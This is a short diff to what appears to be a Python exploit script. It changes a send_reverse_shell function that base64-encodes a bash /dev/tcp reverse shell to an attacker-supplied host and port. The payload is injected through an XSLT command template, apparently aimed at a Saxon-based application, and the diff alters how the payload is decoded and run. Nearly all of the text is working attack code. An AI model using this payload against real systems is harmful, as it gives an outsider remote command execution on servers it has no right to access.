@@ -215,11 +215,10 @@ def send_reverse_shell(session, base_url, token, uuid, lhost, lport):
     """
     Encode reverse shell payload as base64 to avoid XML special character issues
     with redirect operators (>& becomes &amp;& in XML).
-    nohup detaches from Saxon's JVM process tree so the shell survives.
     """
     inner = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     b64 = base64.b64encode(inner.encode()).decode()
-    cmd = f"nohup bash -c {{echo,{b64}}}|{{base64,-d}}|bash >/dev/null 2>&1 &"
+    cmd = f"printf {b64}|base64 -d|bash"
 
     name = rand_name("rs")
     xsl = XSLT_CMD_TEMPLATE.replace("{CMD}", cmd)
